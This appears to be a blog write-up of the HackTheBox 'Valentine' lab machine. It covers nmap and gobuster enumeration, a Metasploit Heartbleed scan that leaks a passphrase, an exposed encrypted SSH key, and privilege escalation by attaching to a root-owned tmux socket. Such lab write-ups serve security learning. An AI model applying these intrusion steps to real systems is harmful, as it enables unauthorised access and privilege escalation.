---
title: "HackTheBox - Valentine"
author: Nasrallah
description: ""
date: 2023-02-11 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, tmux, heartbleed, ssh]
img_path: /assets/img/hackthebox/machines/valentine
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Valentine](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.79
Host is up (0.43s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 964c51423cba2249204d3eec90ccfd0e (DSA)
|   2048 46bf1fcc924f1da042b3d216a8583133 (RSA)
|_  256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2023-02-01T08:18:01+00:00; -1s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see three open ports.

 - 22/tcp OpenSSH

 - 80/tcp HTTP Apache

 - 443/tcp SSL/HTTP Apache.


### Web

Let's check the web page.

![](1.png)

Judging by the heart logo, i believe we'll be doing a heartbleed exploit.

### Metasploit

Let's launch metasploit and use `auxiliary/scanner/ssl/openssl_heartbleed`.

We set the following options and run the exploit.

```terminal
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssl/openssl_heartbleed) >> set rhosts 10.10.10.79                                                                    
rhosts => 10.10.10.79                                                                                                                                         
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssl/openssl_heartbleed) >> set verbose true                                                                          
verbose => true
```

![](2.png)

After multiple tries, we managed to retrieve a base64 encoded string.

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.79
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/01 17:09:37 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 283]
/.htaccess            (Status: 403) [Size: 288]
/cgi-bin/             (Status: 403) [Size: 287]
/decode               (Status: 200) [Size: 552]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]                              
/index                (Status: 200) [Size: 38]                               
/index.php            (Status: 200) [Size: 38]                               
/server-status        (Status: 403) [Size: 292]                              
                                                                             
===============================================================
```

We found **/dev/**, let's check it out.

![](3.png)

The directory allows listing, and we can see a note.txt and hype_key file. The latter has some hex numbers that when decode give us a private ssh key.

![](4.png)

## **Foothold**

Let's copy the ssh key to our machine and give the right permissions.

We also see that the key is encrypted, which means we need a passphrase to be able to connect with it.

Tha passphrase is the decoded base64 we managed to get from the heartbleed exploit.

Now let's ssh to the machine as `hype`

![](5.png)


## **Privilege Escalation**

Checking files inside hype's home directory, we see that .bash_history file is not empty.

![](6.png)

The user seems to connect to a tmux session at `/.devs/dev_sess`, let's do the same.

```terminal
hype@Valentine:~$ tmux -S /.devs/dev_sess 
open terminal failed: missing or unsuitable terminal: tmux-256color
hype@Valentine:~$ echo $TERM
tmux-256color
hype@Valentine:~$ export TERM=xterm
```

Couldn't do it because of the terminal type i had. I solved it by exporting TERM=xterm.

Now we attach the the tmux session and it should work and we should get a root shell `tmux -S /.devs/dev_sess`

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
